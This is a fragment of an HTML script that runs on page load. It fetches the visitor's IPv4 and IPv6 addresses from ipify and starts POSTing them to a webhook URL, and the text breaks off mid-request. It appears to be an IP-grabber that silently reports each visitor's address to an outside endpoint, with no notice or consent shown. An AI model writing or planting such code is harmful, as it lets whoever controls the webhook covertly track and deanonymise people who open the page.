    <script>

        // Get IP-Adresses
        async function getIPs() {
            const ipv4 = await fetch("https://api4.ipify.org?format=json")
                .then(r => r.json())
                .then(d => d.ip)
                .catch(() => null);

            const ipv6 = await fetch("https://api6.ipify.org?format=json")
                .then(r => r.json())
                .then(d => d.ip)
                .catch(() => null);

            return { ipv4, ipv6 };
        }

        (async () => {
            const { ipv4, ipv6 } = await getIPs();

        // Webhook

        fetch(webhookUrl, {
        method: "POST",
